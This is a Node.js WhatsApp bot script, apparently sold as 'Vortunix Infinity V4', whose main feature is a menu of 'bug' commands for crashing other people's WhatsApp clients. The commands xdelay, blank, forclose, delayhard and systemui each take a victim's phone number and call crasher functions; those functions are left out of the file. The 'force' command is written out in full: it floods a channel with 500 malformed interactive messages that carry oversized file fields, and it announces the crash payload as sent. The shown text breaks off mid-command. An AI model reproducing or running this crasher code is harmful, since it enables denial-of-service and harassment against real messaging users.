/*

<!> Ini Adalah Base Bot Simple Created By @GyzenVtx

<!> Jika Kalian Tertarik Menggunakan Base Ini Tolong Jangan Hapus Credits Ya!

─────────────────────────────────────────────────────────

<!> This Is A Simple Bot Base Created By @GyzenVtx

<!> If You Are Interested In Using This Base Please Don't Delete The Credits!

*/

require('./config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const cheerio = require('cheerio')
const path = require('path')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const bugres = 'In processs'
const RC = fs.readFileSync('./hafiz.jpg')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')

module.exports = syah = async (syah, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await syah.decodeJid(syah.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await syah.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!syah.public) {
if (!isCreator) return
}

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#3498db").bold(`⚙️ New Messages`));
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Date: ${new Date().toLocaleString()} \n` +
` ├─ ▢ Message: ${m.body || m.mtype} \n` +
` ├─ ▢ Sender: ${m.pushname} \n` +
` ╰─ ▢ Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Group: ${groupName} \n` +
` ╰─ ▢ GroupJID: ${m.chat}`
)
);
}
console.log();
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

const BenkzjiiBotz = [botNumber, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const Pou = fs.readFileSync('./hafiz.jpg')

const pouReply = (teks) => {
    syah.sendMessage(from, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                title: 'GyzenOffc',
                body: 'Vortunix Infinity𝘐',
                previewType: 'PHOTO',
                thumbnailUrl: 'http://tmpfiles.org/dl/8710979/1754125603789.jpg'
            }
        }
    }, { quoted: pap })
}
//====================( Tempat Function Bug )============================


//====================( Batas Function Bug )==============================
async function replygw(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.namabot}`,
newsletterJid: global.idSaluran + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `Gyzen Official`,
body: `Vortunix Infinity V4`,
previewType: "VIDEO",
thumbnailUrl: './menu.jpg', 
sourceUrl: global.url,  
},
},
text: teks,
};
return syah.sendMessage(m.chat, nedd, {quoted: fkontak,});
}
const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": `υρтιмє : ${runtime(process.uptime())}`,
                    "jpegThumbnail": ''
                          }
                        }
                      } 
const reaction = async (jidss, emoji) => {
syah.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': 
case 'v4': {
 const emojis = ['🩸', '🕊', '⚔️'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await syah.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
ー ( 👋 )─ こんにちは 私の名前は Vortunix Infinity です。私は Gyzen Official によって作られました。そして、あなたを危害から守り、WhatsApp のシステムを根絶する任務を与えられました。#マーク・ズプレク

╭━✧「 𝐕𝐎𝐑𝐓𝐔𝐍𝐈𝐗 ° 𝐒𝐘𝐒𝐓𝐄𝐌 」
┃⬡ Developer : Gyzen Official
┃⬡ BotName : Vortunix Infinity
┃⬡ Version : 4.0.0
┃⬡ Status : Vvip Buy Only!! 
┃⬡ TikTok : tiktok.com/@gyzenisback_1
╰━━━━━━━━━━━━━━━━❍

╭━✧「 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚 」
┃ ┏━━━━━❐
┃ ⧎${prefix}xᴅᴇʟᴀʏ
┃ ⧎${prefix}ғᴏʀᴄʟᴏsᴇ
┃ ⧎${prefix}sʏsᴛᴇᴍᴜɪ
┃ ⧎${prefix}ʙʟᴀɴᴋ
┃ ⧎${prefix}ᴅᴇʟᴀʏʜᴀʀᴅ
┃ ┗━━━━━━━━━━❏
╰════════════════❍
╭━✧「 𝗕𝗨𝗚 𝗦𝗔𝗟𝗨𝗥𝗔𝗡 」
┃ ┏━━━━━❐
┃ ⧎${prefix}ғᴏʀᴄᴇ
┃ ┗━━━━━━━━━━❏
╰════════════════❍
╭━✧「 𝗠𝗘𝗡𝗨 𝗙𝗨𝗡𝗡 」
┃ ┏━━━━━❐
┃ ⧎${prefix}ʙʀᴀᴛ
┃ ⧎${prefix}ᴘʟᴀʏ
┃ ⧎${prefix}ᴄᴇᴋɪᴅᴄʜ
┃ ⧎${prefix}ʜɪᴅᴇᴛᴀɢ
┃ ⧎${prefix}ʜᴇɴᴛᴀɪ
┃ ┗━━━━━━━━━━❏
╰════════════════❍
╭━✧「 𝗠𝗘𝗡𝗨 𝗧𝗢𝗢𝗟𝗦 」
┃ ┏━━━━━❐
┃ ⧎${prefix}ᴇɴᴄʀʏᴘᴛʜᴀʀᴅ
┃ ⧎${prefix}ʀᴇᴀᴄᴛᴄʜ
┃ ⧎${prefix}ʀᴇᴀᴄᴛᴄʜ
┃ ⧎${prefix}ᴛᴏᴜʀʟ
┃ ┗━━━━━━━━━━❏
╰════════════════❍

╭━✧「 𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 」
┃ ┏━━━━━━☬
┃ ⧎ ${prefix}ᴀᴅᴅᴍᴜʀʙᴜɢ 
┃ ⧎ ${prefix}ᴅᴇʟᴍᴜʀʙᴜɢ 
┃ ⧎ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ 
┃ ⧎ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ 
┃ ⧎ ${prefix}sᴇʟғ
┃ ⧎ ${prefix}ᴘᴜʙʟɪᴄ
┃ ┗━━━━━━━━━━━━☬
╰═════════════════❍
\`𝘗𝘐𝘓𝘐𝘏 𝘋𝘐𝘉𝘜𝘕𝘜𝘏 𝘈𝘛𝘈𝘜 𝘔𝘌𝘔𝘉𝘜𝘕𝘜𝘏 𝘗𝘐𝘓𝘐𝘏𝘈𝘕 𝘈𝘋𝘈 𝘋𝘐 𝘛𝘈𝘕𝘎𝘈𝘕 𝘈𝘕𝘋𝘈\``;


     let buttons = [
       { buttonId: ".tqto", buttonText: { displayText: "THANKS"} },
       { buttonId: ".scrip", buttonText: { displayText: "SCRIP" } }
     ];

     let buttonMessage = {
       image: fs.readFileSync('./hafiz.jpg'),
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'GyzenOffc',
           body: 'Vortunix Infinity V4',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '120363420016823962@newsletter',
           newsletterName: 'GYZEN OFFICIAL',
           serverMessageId: -1
         }
       },
       footer: "Vortunix Infinity V4",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "σρҽɳɱҽɳυ",
             sections: [
               {
                 title: "⍴іᥣіһ mᥱᥒᥙ ძі ᑲᥲᥕᥲһ",
                 highlight_label: "POWER BY GYZEN🩸",
                 rows: [
                   { title: "", description: "SCRIP MENU", id: ".scrip" },
                   { title: "", description: "OWNER MENU", id: ".owner" }                  
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await syah.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;

case "tqto": case "thanksto": {
const emojis = ['🔥', '🦅', '🐉'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await syah.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
let menu = `╭─〔 THANKS TO ALL 〕
┆=★ @GyzenVtx ( Developer ) 
┆=★ @SakuraCreator ( Creator ) 
┆=★ @RullBJN ( Patner ) 
┆=★ @Karisznatzu ( Patner ) 
┆=★ @Bayuffc ( Patner ) 
┆=★ @leonzee1 ( Patner ) 
┆=★ @saipulstr ( Patner ) 
┆=★ @fikzystur ( Patner ) 
┆=★ @TanzThisBoy ( Patner ) 
┆=★ @fanzzy127 ( Patner ) 
┆=★ @Sammxofficial ( Patner ) 
┆=★ @KIYUROze ( Patner ) 
┆=★ @ikysuu ( Patner ) 
┆=★ @balz_store6 ( Patner ) 
┆=★ @ulzz_cha ( Patner ) 
┆=★ @zennfloww ( Patner ) 
┆=★ @danzhost1 ( Patner ) 
┆=★ @vvvvai1 ( Patner ) 
┆=★ @AlwaysVero ( Patner ) 
┆=★ @ArszzNotDev ( Patner ) 
┆=★ @chibulpew ( Patner ) 
┆=★ @fazzambon ( Patner ) 
┆=★ @GadzzModss ( Patner ) 
┆=★ @HamzzOffc ( Patner ) 
┆=★ @UHUYOS ( Patner ) 
┆=★ @RizzXyzy ( Patner ) 
┆=★ @phyrooxx ( Patner ) 
┆=★ @Rilzloww ( Patner ) 
┆=★ @akuwongmucak321 ( Patner ) 
┆=★ @Ruackk ( Patner ) 
┆=★ @RakaNotDev ( Patner ) 
┆=★ @skaystorea ( Patner ) 
┆=★ @HellNotDev ( Patner ) 
┆=★ @fiffxxyz ( Patner ) 
┆=★ @Hanzoficial ( Patner ) 
┆=★ @fanzu14 ( Patner ) 
┆=★ @panpanalywz ( Patner ) 
┆=★ @yakkzzofc ( Patner ) 
┆=★ @RIJALOffciall ( Patner ) 
┆=★ @reyxatan ( Patner ) 
┆=★ @SALppk ( Patner ) 
┆=★ @DANZ_SHISUI ( Patner ) 
┆=★ @renxzyyy ( Patner ) 
╰─────────────────
`
let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "OWNER"} },
       { buttonId: ".scrip", buttonText: { displayText: "SCRIP" } }
     ];

     let buttonMessage = {
       image: fs.readFileSync('./tqto.jpg'),
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'Vortunix 𝚅4',
           body: 'GyzenVtx',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '120363420016823962@newsletter',
           newsletterName: 'GYZEN OFFICIAL',
           serverMessageId: -1
         }
       },
       footer: "Vortunix Infinity",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "σρҽɳɱҽɳυ",
             sections: [
               {
                 title: "⍴іᥣіһ mᥱᥒᥙ ძі ᑲᥲᥕᥲһ",
                 highlight_label: "GYZEN GANTENG",
                 rows: [
                   { title: " ", description: "BACK MENU", id: ".menu" },
                   { title: " ", description: "OWNER MENU", id: ".owner" }                  
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await syah.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;
case 'scrip': {
 const emojis = ['🩸', '😸', '⚠️'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await syah.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
╔═══\` BUY SCRIPT \`═══
║
║ \`MAU BELI SCRIPT INI?\`
║
║ — VORTUNIX V4
║ 
║🪽 Whatsapp : wa.me/6283891115385
║🪽 Telegram : https://t.me/GyzenVtx
╚═════════════════`;


     let buttons = [
       { buttonId: ".tqto", buttonText: { displayText: "THANKS"} },
       { buttonId: ".scrip", buttonText: { displayText: "SCRIP" } }
     ];

     let buttonMessage = {
       image: fs.readFileSync('./displays/doraki.jpg'),
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: 'Vortunix V4',
           body: 'GYZEN GANTENG',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '120363420016823962@newsletter',
           newsletterName: 'GYZEN OFFICIAL',
           serverMessageId: -1
         }
       },
       footer: "Vortunix Infinity",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "σρҽɳɱҽɳυ",
             sections: [
               {
                 title: "⍴іᥣіһ mᥱᥒᥙ ძі ᑲᥲᥕᥲһ",
                 highlight_label: "GYZEN",
                 rows: [
                   { title: " ", description: "BACK MENU", id: ".menu" },
                   { title: " ", description: "OWNER MENU", id: ".owner" }                  
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await syah.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;
//CASE BUG Danger
 case 'xdelay': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: ${target}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`);

  await delay(1500);

  m.reply(`╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: ${target}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`);

  // Mulai crasher
  await xdelayinvis(target);

  syah.sendMessage(from, {
    react: {
      text: "🇷🇺",
      key: m.key
    }
  });
}
break;


case 'blank': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: ${target}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`);

  await delay(1500);

  m.reply(`╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: ${target}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`);

  // Mulai crasher
  await hytam(target);
  await delay(1000);

  syah.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;
 

case 'forclose': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: ${target}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`);

  await delay(1500);

  m.reply(`╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: ${target}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`);

  // Mulai crasher
  await forclose(target);
  await delay(1000);

  syah.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'delayhard': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: ${target}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`);

  await delay(1500);

  m.reply(`╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: ${target}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`);

  // Mulai crasher
  await delayhard(target);
  await delay(1000);

  syah.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'systemui': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 」━━═╗
┋ Target: ${target}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`);

  await delay(1500);

  m.reply(`╔═━━「 𝗦𝘂𝗰𝗲𝘀𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: ${target}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`);

  // Mulai crasher
  await systemui(target);
  await delay(1000);

  syah.sendMessage(from, {
    react: {
      text: "☠️",
      key: m.key
    }
  });
}
break;

case 'force': {
    if (!isCreator) return reply('❌ Fitur khusus user premium');

    if (!q) return m.reply(`*Gunakan format: ${prefix + command} <id_channel>*\nContoh: ${prefix + command} 120363400128698308@newsletter`);

    const idChannel = q.replace(/[^0-9@.a-zA-Z]/g, "");

    if (!idChannel.includes("@")) return m.reply(`❌ *ID tidak valid!*\nContoh: ${prefix + command} 120363400128698308@newsletter`);

    const tasks = [];

    for (let i = 0; i < 500; i++) {
        const msg = generateWAMessageFromContent(idChannel, {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 9999999999999,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                        mediaKeyTimestamp: 1735456100,
                        contactVcard: true,
                        caption: "F*ucking Everyone"
                    }
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "review_order",
                            buttonParamsJson: {
                                reference_id: "trigger",
                                order: {
                                    status: "flex_agency",
                                    order_type: "ORDER"
                                },
                                share_payment_status: true
                            }
                        }
                    ],
                    messageParamsJson: "".repeat(10000)
                }
            }
        }, { userJid: idChannel });

        tasks.push(syah.relayMessage(idChannel, msg.message, { messageId: msg.key.id }));
    }

    await Promise.all(tasks);

    await m.reply(`✅ Payload crash berhasil dikirim ke: ${idChannel} `);
}
break;

//CASE MD/ADD
case 'addmurbug': {
    if (!isCreator) return replygw("Owner only!");
    if (!args[0]) return replygw(`Usage: ${prefix + command} 62xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await syah.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return replygw("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));

    replygw("Success! User added to premium.");
}
break;

case 'delmurbug': {
    if (!isCreator) return replygw("Owner only!");
    if (!args[0]) return replygw(`Usage: ${prefix + command} 62xxx`);

    let number = text.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));
        replygw("Success! User removed from premium.");
    } else {
        replygw("User is not in the premium list.");
    }
}
break;

case "addowner": case "addown": {
    if (!isCreator) return replygw("Owner only.");
    if (!args[0]) return replygw(`Usage: ${command} 62xxx`);

    let number = text.replace(/[^0-9]/g, '');
    let checkNumber = await syah.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return replygw("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./database/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./database/premium.json', JSON.stringify(Premium));

    replygw("Owner added successfully.");
}
break;

case 'public': {
    if (!isCreator) return replygw("Owner only.");
    syah.public = true;
    replygw("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return replygw("Owner only.");
    syah.public = false;
    replygw("Bot set to private mode.");
}
break;

    case 'reactch': {
      if (!isCreator) return onlyOwn()

